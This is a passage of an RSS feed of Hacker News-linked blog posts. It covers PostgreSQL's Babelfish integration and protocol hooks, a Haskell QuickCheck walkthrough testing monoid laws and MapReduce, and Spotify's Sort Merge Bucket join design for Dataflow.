<p>Only very recently (Feb 10th, 11th) some initial, very interesting, discussion around this proposal has started (including a very interesting offer to <a href="https://www.postgresql.org/message-id/CADUqk8UndFi7WHVNZscs4ZCk37_2aBUw-K32QA7sQd_3cJ%2Bqng%40mail.gmail.com">open source MySQL protocol compatibility for Postgres!</a>). It’s understandable, it’s a very busy time for PostgreSQL hackers (the last Commitfest for feature inclusion into PostgreSQL 14 is ongoing). But Babelfish was already announced more than two months ago; and it could be published anytime. I believe we need to start a deeper conversation about Postgres-Babelfish integration sooner than later. And what is being discussed so far are mainly technical considerations around the integration of one of the possibly several integration points that may be required. <strong>I’d love to also have a strategic discussion, where the Community would address, from a leadership perspective, what would be the plans for integrating, or not, Babelfish</strong>. <strong>Is Babelfish the Elephant in the Room?</strong> Probably not anymore, but I anyway hope this post will help, at the very least, to spark the strategic discussion.</p>
<p>What is the alternative? What will happen if PostgreSQL would not implement such hooks or will not pursue understanding with AWS, for the common benefit, and help Babelfish and PostgreSQL cooperate and allow for code bases integration?</p>
<p><strong>Under this scenario, AWS will probably have to keep Babelfish as a fork</strong>. For one, AWS already keeps Aurora as a fork, even though it’s an internal one. Given AWS’ well-known customer obsession and that AWS doesn’t kill services that they started offering, I think that if given no other chance they will keep Babelfish as a separate fork, getting its own share of features and contributors. Surely AWS knows that maintaining a fork is expensive. And I believe they have no intention to have it as a fork (otherwise, they won’t be publishing it as open source). So there will be serious intentions and efforts to merge it into PostgreSQL, for the benefit of all. But the recent Elastic case has demonstrated that AWS is committed to the open source software that is part of their managed services, and are willing to step up with a lot of resources when they are required to continue serving their customers. Apparently AWS has around 200 open job positions (!!) for developers working on Elasticsearch. Surely they can do the same for Babelfish, especially given that RDS Postgres/Aurora/Babelfish is probably a much larger business for them than Elastic.</p>
<h2 id="on-protocol-hooks">On protocol hooks</h2>
<p>Jan also argued that “<em>Creating the necessary infrastructure in the postmaster and backend will open up more possibilities, that are not tied to our compatibility efforts. Possible use cases for wire protocol extensibility include the development of a completely new, not backwards compatible PostgreSQL protocol or extending the existing wire protocol</em>”. I cannot agree more. This effort not only benefits the Babelfish integration; but also opens the door for new PostgreSQL protocols.</p>
<p>The current PostgreSQL protocol (v3) <a href="https://www.postgresql.org/docs/7.4/release-7-4.html">has been in use since PostgreSQL 7.4</a>, released in 2003. It works well, and has spun the broadest possible set of drivers, tools and even compatible databases that use it (like CockroachDB, Crate.io or NoisePage, for example). But it also has some limitations and well-known problems. There is an entry in PostgreSQL “TODO” about <a href="https://wiki.postgresql.org/wiki/Todo#Wire_Protocol_Changes_.2F_v4_Protocol">proposed changes for an eventual v4 version of the protocol</a>. I also participated in another <a href="https://github.com/pgjdbc/pgjdbc/blob/95ba7b261e39754674c5817695ae5ebf9a341fae/backend_protocol_v4_wanted_features.md">“brain dump” on v4 proposed features</a>. But despite much talk, v4 has not happened and there’s no ongoing effort to make it happen. v3 is to stay for long.</p>
<p>Why is that, why can’t the protocol evolve? Have a look at <a href="https://www.postgresql.org/message-id/CD5C1525-8B2C-4986-87F0-B1CB3B52ACA7%40wa-research.ch">this thread</a>, where a proposal to implement an HTTP protocol for PostgreSQL was made. Other than the proposal about HTTP itself –which has its own merits, and is a topic that I believe should definitely be discussed again–, the general sentiment was that <strong>any new protocol would have to provide all the features that the current protocol has, work for every use case, do not disrupt existing drivers or provide good means for driver rewrites; and do it significantly better than the current one</strong>.</p>
<h2 id="the-innovators-dilemma">The Innovator’s Dilemma</h2>
<p>I don’t have an MBA, but this to me is a clear case of <a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma">The Innovator’s Dilemma</a>. PostgreSQL protocol v3 is the incumbent, and protocol v4 and/or other protocols like HTTP are the potential disruptive innovators. In what looks like a perfect match for Christensen’s book, a disruptive protocol innovation “<em>would not initially satisfy the demands of even the high end of the market</em>”. In other words, initial versions of these protocols should not target feature parity with the incumbent. They should rather focus on doing the basics, but much better, with a compelling higher value proposition.</p>
<p>Eventually, these protocols “<em>will surpass sustaining technologies</em>” and may end up replacing the current v3 protocol. This was very well explained by Prof. Clayton and is represented on his famous graph comparing the product …</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</a></em></p>]]>
            </description>
            <link>https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114281</guid>
            <pubDate>Fri, 12 Feb 2021 14:58:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzz me wrong – How QuickCheck destroyed my favourite theory]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 53 (<a href="https://news.ycombinator.com/item?id=26112441">thread link</a>) | @lrngjcb
<br/>
February 12, 2021 | https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on January 30, 2021
    
        by Thomas Mahler
    </em></p></div>

<h2 id="introduction">Introduction</h2>
<p>Quite a while back I wrote a larger article on the algebraic foundation of software patterns which also covered the <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">MapReduce algorithm</a>.</p>
<p>During the research digged out a paper on <a href="https://pdfs.semanticscholar.org/0498/3a1c0d6343e21129aaffca2a1b3eec419523.pdf">algebraic properties of distributed big data analytics</a>, which explained that a MapReduce will always work correctly when the intermediate data structure resulting from the <code>map</code>-phase is a Monoid under the <code>reduce</code>-operation.</p>
<p>For some reason, I was not convinced that this Monoid-condition was enough, because all the typical examples like word-frequency maps are even <strong>commutative</strong> Monoids under the respective reduce operation.</p>
<p>So I came up with the following personal theory:</p>
<blockquote>
<p>Only if the intermediate data structure resulting from the <code>map</code>-phase is a <strong>commutative Monoid</strong> under the <code>reduce</code>-operation, then a parallel MapReduce will produce correct results.</p>
</blockquote>
<p>I tried to validate this property using the <a href="https://wiki.haskell.org/Introduction_to_QuickCheck2">QuickCheck test framework</a>.</p>
<p>Interestingly the QuickCheck tests failed! This finally convinced me that my theory was wrong, and after a little deeper thought, I could understand why.</p>
<p>I was impressed with the power of QuickCheck, so I thought it would be a good idea to share this lesson in falsification.</p>
<p>The code shown in this blog <a href="https://github.com/thma/CommutativeMonoid">is also available on GitHub</a></p>
<h2 id="commutative-monoids">Commutative Monoids</h2>
<p>In abstract algebra, a monoid is a <em>set</em> equipped with an <em>associative binary operation</em> and an <em>identity element</em>.</p>
<p>The simplest example for a <em>commutative Monoid</em> is <span>\((\mathbb{N}_0, +, 0)\)</span>: the natural numbers under addition with <span>\(0\)</span> as the identity (or neutral) element. We can use QuickCheck to verify that indeed the Monoid laws plus commutativity are maintained.</p>
<p>If we want to use <code>GHC.Natural</code> type to represent natural numbers, we first have to make <code>Natural</code> instantiate the <code>Arbitrary</code> type class which is used by QuickCheck to automatically generate test data:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span>           <span>Test.QuickCheck</span> (<span>Arbitrary</span>, arbitrary, <span>NonNegative</span> (..))</span>
<span id="cb1-2"><span>import</span>           <span>GHC.Natural</span>     (<span>Natural</span>, naturalFromInteger)</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>instance</span> <span>Arbitrary</span> <span>Natural</span> <span>where</span></span>
<span id="cb1-5">  arbitrary <span>=</span> <span>do</span></span>
<span id="cb1-6">    <span>NonNegative</span> nonNegative <span>&lt;-</span> arbitrary</span>
<span id="cb1-7">    <span>return</span> <span>$</span> naturalFromInteger nonNegative</span></code></pre></div>
<p>Now we can start to write our property based tests. For algebraic structures it is straightforward to come up with properties: we just write the required laws (associativity, 0 is identity element and commutativity) as properties.</p>
<p>I am using Hspec as a wrapper around QuickCheck as it provides a very nice testing DSL which makes it easy to read the code and the output of the test suite:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span>           <span>Test.Hspec</span></span>
<span id="cb2-2"></span>
<span id="cb2-3"><span>spec ::</span> <span>Spec</span></span>
<span id="cb2-4">spec <span>=</span> <span>do</span></span>
<span id="cb2-5">  describe <span>"The Monoid 'Natural Numbers under Addition'"</span> <span>$</span> <span>do</span></span>
<span id="cb2-6">    it <span>"is associative"</span> <span>$</span></span>
<span id="cb2-7">      property <span>$</span> \x y z <span>-&gt;</span> ((x <span>+</span> y) <span>+</span> z) <span>`shouldBe`</span> ((x <span>+</span> (y <span>+</span> z))<span> ::</span> <span>Natural</span>)</span>
<span id="cb2-8">      </span>
<span id="cb2-9">    it <span>"has 0 as left and right identity element"</span> <span>$</span></span>
<span id="cb2-10">      property <span>$</span> \x <span>-&gt;</span> (x <span>+</span> <span>0</span> <span>`shouldBe`</span> (<span>x ::</span> <span>Natural</span>)) <span>.&amp;&amp;.</span> (<span>0</span> <span>+</span> x <span>`shouldBe`</span> x)</span>
<span id="cb2-11">      </span>
<span id="cb2-12">    it <span>"is commutative"</span> <span>$</span></span>
<span id="cb2-13">      property <span>$</span> \x y <span>-&gt;</span> x <span>+</span> y <span>`shouldBe`</span> (y <span>+</span><span> x ::</span> <span>Natural</span>)</span></code></pre></div>
<p>The output of these tests will be as follows:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>Monoid</span></span>
<span id="cb3-2">  <span>The</span> Monoid <span>'Natural Numbers under Addition'</span></span>
<span id="cb3-3">    <span>is</span> associative</span>
<span id="cb3-4">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-5">    <span>has</span> 0 as identity (or neutral) <span>element</span></span>
<span id="cb3-6">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-7">    <span>is</span> commutative</span>
<span id="cb3-8">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>So behind the scenes, QuickCheck has generated test data for 100 tests for each property under test. For all these data the test cases passed.</p>
<p>This is definitely not a proof. But it gives us some confidence that our math text-books are correct when giving Natural Numbers under addition as an example for a commutative Monoid.</p>
<p>OK, that was easy! Now let’s move to non-commutative Monoids.</p>
<h2 id="non-commutative-monoids">Non-commutative Monoids</h2>
<p>Strings (or any other Lists) under concatenation are a typical example. It’s easy to see that <code>"hello" ++ ("dear" ++ "people")</code> equals <code>"(hello" ++ "dear") ++ "people"</code>, but that <code>"hello" ++ "world"</code> differs from <code>"world" ++ "hello"</code>.</p>
<p>Now let’s try to formalize these intuitions as QuickCheck property based tests again.</p>
<p>First I’m introducing an alias for <code>(++)</code>, as it is defined on any list type, it would be required to have type signatures in all properties (as we had all those <code>:: Natural</code> signatures in the examples above). So I define an operation <code>(⊕)</code> which is only defined on <code>String</code> instances:</p>
<div id="cb4"><pre><code><span id="cb4-1">(⊕)<span> ::</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb4-2">(⊕) a b <span>=</span> a <span>++</span> b</span></code></pre></div>
<p>Now we can extend our test suite with the following test cases:</p>
<div id="cb5"><pre><code><span id="cb5-1">  describe <span>"The Monoid 'Strings under concatenation'"</span> <span>$</span> <span>do</span></span>
<span id="cb5-2">    </span>
<span id="cb5-3">    it <span>"is associative"</span> <span>$</span> </span>
<span id="cb5-4">      property <span>$</span> \x y z <span>-&gt;</span> ((x ⊕ y) ⊕ z) <span>`shouldBe`</span> (x ⊕ (y ⊕ z))</span>
<span id="cb5-5">      </span>
<span id="cb5-6">    it <span>"has \"\" as left and right identity element"</span> <span>$</span></span>
<span id="cb5-7">      property <span>$</span> \x <span>-&gt;</span> (x ⊕ <span>""</span> <span>`shouldBe`</span> x) <span>.&amp;&amp;.</span> (<span>""</span> ⊕ x <span>`shouldBe`</span> x)</span></code></pre></div>
<p>The output looks promising:</p>
<div id="cb6"><pre><code><span id="cb6-1">  <span>The</span> Monoid <span>'Strings under concatenation'</span></span>
<span id="cb6-2">    <span>is</span> associative</span>
<span id="cb6-3">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb6-4">    <span>has</span> <span>""</span> as left and right identity element</span>
<span id="cb6-5">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>Now let’s try to test the non-commutativity:</p>
<div id="cb7"><pre><code><span id="cb7-1">    it <span>"is NOT commutative"</span> <span>$</span></span>
<span id="cb7-2">      property <span>$</span> \x y <span>-&gt;</span> x ⊕ y <span>`shouldNotBe`</span> y ⊕ x</span></code></pre></div>
<p>But unfortunately the output tells us that this is not true:</p>
<div id="cb8"><pre><code><span id="cb8-1">    <span>is</span> NOT commutative FAILED [1]</span>
<span id="cb8-2"></span>
<span id="cb8-3">  <span>1</span>) <span>Monoid</span>, The Monoid <span>'Strings under concatenation'</span>, is NOT commutative</span>
<span id="cb8-4">       <span>Falsifiable</span> (after 1 test)<span>:</span></span>
<span id="cb8-5">         <span>""</span></span>
<span id="cb8-6">         <span>""</span></span>
<span id="cb8-7">       <span>not</span> expected: <span>""</span></span></code></pre></div>
<p>We formulated the property in the wrong way. The <code>(⊕)</code> <em>may be commutative for some</em> edge cases, e.g.&nbsp;when one or both of the arguments are <code>""</code>. But it is not commutative <em>in general</em> – that is for all possible arguments.</p>
<p>We could rephrase this property as <em>“There exists at least one pair of arguments <span>\((x, y)\)</span> for which <span>\(\oplus\)</span> is not commutative”</em>:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ]\]</span></p>
<p>QuickCheck does not come with a mechanism for <em>existential quantification</em>. But as is has <code>forAll</code>, that is <em>universal quantification</em>. So we can try to make use of the following equivalence:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ] 
  \equiv 
  \neg \forall (x,y) \left [ x \oplus y = y \oplus x \right ]\]</span></p>
<p>Unfortunately we can not write this simply as <code>not forAll</code>, as <code>forAll</code> returns a <code>Property</code> but <code>not</code> expects a <code>Bool</code>. But as explained in <a href="https://stackoverflow.com/questions/42764847/is-there-a-there-exists-quantifier-in-quickcheck">this discussion on Stackoverflow</a> it is still posible to implement our own <code>exists</code>:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>exists ::</span> (<span>Show</span> a, <span>Arbitrary</span> a) <span>=&gt;</span> (a <span>-&gt;</span> <span>Bool</span>) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-2">exists <span>=</span> forSome <span>$</span> resize <span>1000</span> arbitrary</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>forSome ::</span> (<span>Show</span> a, <span>Testable</span> prop) <span>=&gt;</span> <span>Gen</span> a <span>-&gt;</span> (a <span>-&gt;</span> prop) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-5">forSome gen prop <span>=</span></span>
<span id="cb9-6">  mapResult (\r <span>-&gt;</span> r {P.reason <span>=</span> <span>"No witness found."</span>, P.callbacks <span>=</span> []}) <span>$</span></span>
<span id="cb9-7">    once <span>$</span> disjoin <span>$</span> <span>replicate</span> <span>1000</span> <span>$</span> forAll gen prop</span></code></pre></div>
<p>Now we can rewrite the property <span>\(\exists (x,y) \left [ x \oplus y \neq y \oplus x \right ]\)</span> as follows:</p>
<div id="cb10"><pre><code><span id="cb10-1">    it <span>"is not commutative (via exists)"</span> <span>$</span></span>
<span id="cb10-2">      exists <span>$</span> \(x,y) <span>-&gt;</span> x ⊕ y <span>/=</span> y ⊕ x</span></code></pre></div>
<p>I like how close the Haskell code stays to the concise mathematical formulation! The output of this test fits much better into our intuitive understanding:</p>
<div id="cb11"><pre><code><span id="cb11-1">    <span>is</span> not commutative (via exists)</span>
<span id="cb11-2">      <span>+++</span> OK, passed 1 test.</span></code></pre></div>
<h2 id="sequential-mapreduce">Sequential MapReduce</h2>
<blockquote>
<p>MapReduce is a programming model and an associated implementation for processing and generating large data sets. Users specify <strong>a map function</strong> that processes a key/value pair to generate a set of intermediate key/value pairs, <strong>and a reduce function</strong> that merges all intermediate values associated with the same intermediate key.</p>
<p>[This] abstraction is inspired by the map and reduce primitives present in Lisp and many other functional languages. <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/16cb30b4b92fd4989b8619a61752a2387c6dd474.pdf">Quoted from Google Research</a></p>
</blockquote>
<p>I’m not going into more details here, as You’ll find detailed information on this approach and a working example <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">in my original article</a>.</p>
<p>Here is the definition of a sequential MapReduce:</p>
<div id="cb12"><pre><code><span id="cb12-1">simpleMapReduce </span>
<span id="cb12-2"><span>  ::</span> (a <span>-&gt;</span> b)   <span>-- map function</span></span>
<span id="cb12-3">  <span>-&gt;</span> ([b] <span>-&gt;</span> c) <span>-- reduce function</span></span>
<span id="cb12-4">  <span>-&gt;</span> [a]        <span>-- list to map over</span></span>
<span id="cb12-5">  <span>-&gt;</span> c          <span>-- result</span></span>
<span id="cb12-6">simpleMapReduce mapFunc reduceFunc <span>=</span> reduceFunc <span>.</span> <span>map</span> mapFunc</span></code></pre></div>
<p>We can test the sequential MapReduce algorithm with the following property based test:</p>
<div id="cb13"><pre><code><span id="cb13-1">    it <span>"works correctly with a sequential map-reduce"</span> <span>$</span></span>
<span id="cb13-2">      property <span>$</span> \a b c d <span>-&gt;</span> (simpleMapReduce <span>reverse</span> (<span>foldr</span> (⊕) <span>""</span>) [a,b,c,d]) </span>
<span id="cb13-3">                     <span>`shouldBe`</span> (<span>reverse</span> a) ⊕ (<span>reverse</span> b) ⊕ (<span>reverse</span> c) ⊕ (<span>reverse</span> d)</span></code></pre></div>
<h3 id="excurs-foldmap">Excurs: foldMap</h3>
<p>What I have shown so far just demonstrates the general mechanism of chaining <code>map</code> and <code>reduce</code> functions without implying any parallel execution. Essentially we are chaining a <code>map</code> with a <code>fold</code> (i.e.&nbsp;reduction) function. In the Haskell base library there is a higher order function <code>foldMap</code> that covers exactly this pattern of chaining. Please note that <code>foldMap</code>does only a single traversal of the foldable data structure. It fuses the <code>map</code> and <code>reduce</code> phase into a single one by function composition of <code>mappend</code> and the mapping function <code>f</code>:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>-- | Map each element of the structure to a monoid,</span></span>
<span id="cb14-2"><span>-- and combine the results.</span></span>
<span id="cb14-3"><span>foldMap</span><span> ::</span> (<span>Foldable</span> t, <span>Monoid</span> m) <span>=&gt;</span> (a <span>-&gt;</span> m) <span>-&gt;</span> t a <span>-&gt;</span> m</span>
<span id="cb14-4"><span>foldMap</span> f <span>=</span> <span>foldr</span> (<span>mappend</span> <span>.</span> f) <span>mempty</span></span></code></pre></div>
<h2 id="parallel-mapreduce">Parallel MapReduce</h2>
<p>Now we come to the tricky part that kicked off this whole discussion: parallelism.</p>
<p>As an example we consider a simple sequential MapReduce, taking an input list of <code>Int</code>s, computing their squares and computing the sum of these squares:</p>
<div id="cb15"><pre><code><span id="cb15-1">λ<span>&gt;</span> simpleMapReduce (<span>^</span><span>2</span>) (<span>foldr</span> (<span>+</span>) <span>0</span>) [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>]</span>
<span id="cb15-2"><span>30</span></span></code></pre></div>
<p>Let’s try to design this as a massively parallelized algorithm:</p>
<ol type="1">
<li><p>Mapping of <code>(^2)</code> over the input-list <code>[1,2,3,4]</code> would be started in parallel to the reduction of the intermediary list of squares by <code>(foldr (+) 0)</code>.</p></li>
<li><p>The mapping phase will be executed as a set of parallel computations (one for each element of the input list).</p></li>
<li><p>The reduction phase will also be executed as a set of parallel computations (one for each addition).</p></li>
</ol>
<p>Of course the reduction phase can begin only when at least one list element is squared. So in effect the mapping process would have to start first. The parallel computation of squares will result in a non-deterministic sequence of computations. In particular it is not guaranteed that all elements of the input list are processed in the original list order. So it might for example …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112441</guid>
            <pubDate>Fri, 12 Feb 2021 11:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020]]>
            </title>
            <description>
<![CDATA[
Score 190 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26111993">thread link</a>) | @SirOibaf
<br/>
February 12, 2021 | https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020 | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!-- post title -->
        

        <div>
            <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>February 11, 2021</span>
                
            </p>
        </div>
        <!-- post details -->
        <p><a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020/" title="How Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020">
                        <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image1.gif" alt="" loading="lazy" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2021/02/image1.gif">                    </a></p>

        <!-- /post title -->

        
<p>In this post we’ll discuss how Spotify optimized and sped up elements from our largest Dataflow job, <a rel="noreferrer noopener" href="https://engineering.atspotify.com/2020/02/18/spotify-unwrapped-how-we-brought-you-a-decade-of-data/" target="_blank">Wrapped 2019</a>, for <a href="https://open.spotify.com/genre/2020-page">Wrapped 2020</a> using a technique called Sort Merge Bucket (SMB) join. We’ll present the design and implementation of SMB and how we incorporated it into our data pipelines.</p>



<h2>Introduction</h2>



<p>Shuffle is the core building block for many big data transforms, such as a join, GroupByKey, or other reduce operations. Unfortunately, it’s also one of the most expensive steps in many pipelines. Sort Merge Bucket is an optimization that reduces shuffle by doing work up front on the producer side. The intuition is that for datasets commonly and frequently joined on a known key, e.g., user events with user metadata on a user ID, we can write them in bucket files with records bucketed and sorted by that key. By knowing which files contain a subset of keys and in what order, shuffle becomes a matter of merge-sorting values from matching bucket files, completely eliminating costly disk and network I/O of moving key–value pairs around. Andrea Nardelli carried out the original investigation on Sort Merge Buckets for his <a href="http://kth.diva-portal.org/smash/get/diva2:1334587/FULLTEXT01.pdf">2018 master’s thesis</a>, and we started looking into generalizing the idea as a <a rel="noreferrer noopener" href="https://spotify.github.io/scio/extras/Sort-Merge-Bucket.html" target="_blank">Scio module</a> afterwards.</p>



<h2>Design and Implementation</h2>



<p>The majority of the data pipelines at Spotify are written in <a rel="noreferrer noopener" href="https://github.com/spotify/scio" target="_blank">Scio</a>, a Scala API for <a href="https://beam.apache.org/">Apache Beam</a>, and run on the <a href="https://cloud.google.com/dataflow">Google Cloud Dataflow</a> service. We implemented SMB in Java to be closer to the native Beam SDK (and even wrote and collaborated on a <a href="https://docs.google.com/document/d/1AQlonN8t4YJrARcWzepyP7mWHTxHAd6WIECwk1s3LQQ/edit?usp=sharing">design document with the Beam community</a>), and provide Scala syntactic sugar in Scio like many other I/Os. The design is modularized into the main components listed below — we’ll start with the two top-level SMB <a href="https://beam.apache.org/documentation/programming-guide/#transforms" target="_blank" rel="noreferrer noopener">PTransforms</a> — the write and read operations SortedBucketSink and SortedBucketSource.</p>



<h3>SortedBucketSink</h3>



<p>This transform writes a <a rel="noreferrer noopener" href="https://beam.apache.org/documentation/programming-guide/#pcollections" target="_blank">PCollection</a>&lt;T&gt; (where T has a corresponding <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/FileOperations.java" target="_blank" rel="noreferrer noopener">FileOperations&lt;T&gt;</a> instance) in SMB format. It first extracts keys and assigns bucket IDs using logic provided by <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/BucketMetadata.java" target="_blank" rel="noreferrer noopener">BucketMetadata</a>, groups key–values by the ID, sorts all values, and then writes them into files corresponding to bucket IDs using the FileOperations instance.</p>



<p>In addition to the bucket files, a JSON file is also written to the output directory representing the information from BucketMetadata that’s necessary to read the source: the number of buckets, the hashing scheme, and the instructions to extract the key from each record (for example, for Avro records we can encode this instruction with the name of the GenericRecord field containing the key).</p>



<figure><img loading="lazy" width="700" height="255" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-250x91.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-768x280.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-120x44.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5.png 1180w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>SortedBucketSource</h3>



<p>This transform reads from one or more sources written in SMB format with the same key and hashing scheme. It opens file handles for corresponding buckets from each source (using FileOperations&lt;T&gt; for that input type) and merges them while maintaining sorted order. Results are emitted as <a rel="noreferrer noopener" href="https://github.com/apache/beam/blob/master/sdks/java/core/src/main/java/org/apache/beam/sdk/transforms/join/CoGbkResult.java" target="_blank">CoGbkResult</a> objects per key group, the same class Beam uses for regular Cogroup operations, so the user can extract the results per source with the correct parameterized type.</p>



<figure><img loading="lazy" width="700" height="365" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-250x130.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-768x400.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-120x63.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7.png 1067w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>FileOperations</h3>



<p>FileOperations abstracts away the reading and writing of individual bucket files. Since we need fine-grained control over the exact elements and their order in every file, we cannot leverage the existing Beam file I/Os, which operate on a PCollection level and abstract away the locality and order of elements. Instead, SMB file operations happen at a lower level of BoundedSource for input and ParDo for output. Currently Avro, BigQuery TableRow JSON, and TensorFlow TFRecord/Example records are supported. We plan to add other formats like Parquet as well.</p>



<h3>BucketMetadata</h3>



<p>This class abstracts the keying and bucketing of elements, and includes information such as key field, class, number of buckets, shards, and hash function. The metadata is serialized as a JSON file alongside data files when writing, and used to check compatibility when reading SMB sources.</p>



<h3>Optimizations and Variants</h3>



<p>Over the last year and a half we’ve been adopting SMB at Spotify for various use cases, and accumulated many improvements to handle the scale and complexity of our data pipelines.</p>



<ul><li><strong>Date partitioning:</strong> At Spotify, event data is written to Google Cloud Services (GCS) in hourly or daily partitions. A common data engineering use case is to read many partitions in a single pipeline — for example, to compute stream count over the last seven days. For a non-SMB read, this can be easily done in a single PTransform using wildcard file patterns to match files across multiple directories. However, unlike most File I/Os in Beam, the SMB Read API requires the input to be specified as a directory, rather than a file pattern (this is because we need to check the directory’s metadata.json file as well as the actual record files). Additionally, it must match up bucket files across partitions as well as across different sources, while ensuring that the CoGbkResult output correctly groups data from all partitions of a source into the same TupleTag key. We evolved the SMB Read API to accept one or more directories <em>per source</em>.&nbsp;</li></ul>



<ul><li><strong>Sharding:</strong> Although the Murmur class of hash functions we use during bucket assignment usually ensures an even distribution of records across buckets, in some instances one or more buckets may be disproportionately large if the key space is skewed, creating possible OOM errors when grouping and sorting records. In this case, we allow users to specify a number of <em>shards</em> to further split each bucket file. During the bucket assignment step, a value between [0, numShards) is generated randomly <a href="https://beam.apache.org/documentation/runtime/model/#bundling-and-persistence"><em>per bundle</em></a>. Since this value is computed completely orthogonally to the bucket ID, it can break up large key groups across files. Since each shard is still written in sorted order, they can simply be merged together at read time.</li></ul>



<ul><li><strong>Parallelism:</strong> Since the number of buckets in an SMB sink is always a power of 2, we can come up with a joining scheme across sources with different numbers of buckets based off of a desired level of parallelism specified by the user. For example, if the user wants to join Source 1 with 4 buckets and Source 2 with 2 buckets, they can specify either:<ul><li><strong>Minimum parallelism,</strong> or “Merge Greatest Buckets” strategy: 2 parallel readers will be created. Each reader will read 2 buckets from source A and 1 from source B, merging them together. Because bucket IDs are assigned by taking the integer hash value of the key modulo the desired number of buckets, mathematically we know that the key spaces of the merged buckets overlap.</li><li><strong>Maximum parallelism,</strong> or “Least Bucket Replication” strategy: 4 parallel readers will be created. Each reader will read 1 bucket from Source A and 1 from Source B. After merging each key group, the reader will have to rehash the key modulo the greatest number of buckets, to avoid emitting duplicate values. Therefore, even though this strategy achieves a higher level of parallelism, there is some overhead of computing duplicate values and rehashing to eliminate them.</li><li><strong>Auto parallelism:</strong> Creates a number of readers between minimal and maximal amounts, based on a desired split size value provided by the Runner at runtime.</li></ul></li></ul>



